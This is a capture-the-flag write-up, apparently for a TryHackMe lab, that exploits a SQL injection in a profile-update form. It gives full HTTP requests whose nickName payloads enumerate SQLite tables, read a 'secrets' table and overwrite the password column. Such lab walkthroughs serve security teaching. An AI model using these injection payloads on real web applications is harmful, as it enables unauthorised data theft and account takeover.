# Challenge 5: Update Statement

![Pasted image 20210803172027](Pasted%20image%2020210803172027.png)

The goal of this challenge is to exploit a SQL injection vulnerability in the `Edit Profile` form at `/sesqli5/proifle` to read the flag. This form allows you to edit the profile of the currently logged in user, presumably using an `UPDATE` statement. This `UPDATE` statement is vulnerable to SQL injection.

The `Edit Profile` form on `/sesqli5/profile` consists of three inputs: `nickName`, `email`, and `password`. Whether the submission of the `Edit Profile` form is successful or not, it returns you to `/sesqli5/home`. Browsing back to `/sesqli5/profile` though reveals the updated data within the inputs of the form.

When injecting `tgihf'` for the `nickName`, the application doesn't successfully update the record in the database as when `/sesqli5/profile` is subsequently visited, the nick name hasn't been updated to `tgihf'`. Similar with the `email` parameter. These indicate the presence of a SQL injection vunerability in both the `nickName` and `email` parameters.

It appears the underlying SQL `UPDATE` statement looks like this:

```sql
UPDATE $TABLE_NAME SET nickName = '$NICK_NAME', email = '$EMAIL', password = '$PASSWORD_HASH' WHERE $IDENTIFYING_CONDITION
```

The following injection shows that the underlying database is SQLite and its version is 3.22.0.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(sqlite_version()),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

![Pasted image 20210803173927](Pasted%20image%2020210803173927.png)

It also shows that the output of the injection can only be a single column within a single row.

The presence of the SQL injection vulnerability, the fact that it is possible to execute `SELECT` statements and retrieve their output, and the database type and version have all been validated. The next step is to perform some table and column enumeration.

First, determine the number of non-SQLite system tables.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 230
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+COUNT(*)+FROM+sqlite_master+WHERE+type+=+'table'+AND+name+NOT+LIKE+'sqlite_%'),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

There are two.

![Pasted image 20210804094728](Pasted%20image%2020210804094728.png)

Determine the name of the two tables.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 236
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+name+FROM+sqlite_master+WHERE+type+=+'table'+AND+name+NOT+LIKE+'sqlite_%'+LIMIT+0,1),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

![Pasted image 20210804094911](Pasted%20image%2020210804094911.png)

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 236
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+name+FROM+sqlite_master+WHERE+type+=+'table'+AND+name+NOT+LIKE+'sqlite_%'+LIMIT+1,1),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

![Pasted image 20210804094947](Pasted%20image%2020210804094947.png)

The tables' names are `usertable` and `secrets`. The flag most likely resides in `secrets`.

Determine the columns in the `secrets` table.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 223
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+sql+FROM+sqlite_master+WHERE+type+%3d+'table'+AND+name+%3d+'secrets'
),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

Revealing the following statement that was used to create the `secrets` table:

```sql
CREATE TABLE secrets (	id integer primary key,	author integer not null,	secret text not null)
```

Determine the number of records in the `secrets` table.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 228
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+COUNT(*)+FROM+secrets),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

There are 5 records.

![Pasted image 20210804100312](Pasted%20image%2020210804100312.png)

Read the records by incrementing through the `LIMIT` offsets (0-4) in the following request.

```http
POST /sesqli5/profile HTTP/1.1
Host: 10.10.109.88:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 206
Origin: http://10.10.109.88:5000
DNT: 1
Connection: close
Referer: http://10.10.109.88:5000/sesqli5/profile
Cookie: session=.eJy9z7FqAzEMBuB38ZzBOkln382l0CVb5yDbMphecqmdUkrIu9fXlNKxUzfp_0Hou5qm7XUpcEhyETNfzfPTg5lhZ_QoZTGzMTtzkqP26bHKKa6lbUmJL_t72reztHZe62Vf--5HywOzBbKevsv3taZeUfSYnY2SUSBOEimSS8NErDY7n11CFhcnIPEKHkaUqAN6gaA6Qtiu1TWXRbcfDdgeNFmkfph5YHvb_WDemtZDSV-Qe8b_AYzKUUaHCTDgCOATUwdlQNHQ3Ra6BkN2DtQB0gCBEuTkCTLjJH8F8i_g7RPqGYUc.YQqYFg.hBU1GBPvrJ7J_k0Kb6c4JLNtkGA
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

nickName=tgihf',email=(SELECT+id||':'||author||':'||secret+FROM+secrets+LIMIT+0,1
),password='d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1';--+&email=tgihf%40tryhackme.com&password=pass
```

This reveals the following table.

| id | author | secret |
| --- | --- | --- |
| 1 | 1 | Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer a. |
| 2 | 3 | Donec viverra consequat quam, ut iaculis mi varius a. Phasellus. |
| 3 | 1 | Aliquam vestibulum massa justo, in vulputate velit ultrices ac. Donec c    | 
| 4 | 5 | Etiam feugiat elit at nisi pellentesque vulputate. Nunc euismod nulla. |
| 5 | 6 | $THM_FLAG |

The final record contains the flag.
